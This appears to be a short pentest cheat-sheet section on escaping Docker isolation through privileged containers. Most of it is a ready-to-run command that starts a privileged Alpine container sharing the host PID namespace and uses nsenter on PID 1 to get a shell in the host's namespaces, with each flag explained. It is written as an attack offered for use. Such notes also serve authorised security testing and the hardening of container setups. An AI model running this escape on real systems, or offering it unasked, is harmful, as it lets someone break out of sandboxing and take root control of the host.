## Privileged Containers

Privileged containers have access to all syscalls

If able to start containers, just leave the isolation:

```
docker run -it \
    --privileged \
    --pid=host \
    alpine \
	nsenter -t 1 -m -u -n -i sh
```

Parameters of `nsenter`:

- Work with namespaces (nsenter)
- Uses process tree of host (--pid=host)
- Get namespace from PID 1 (-t 1)
- Enter namespaces required for shell (-m -u -n -i)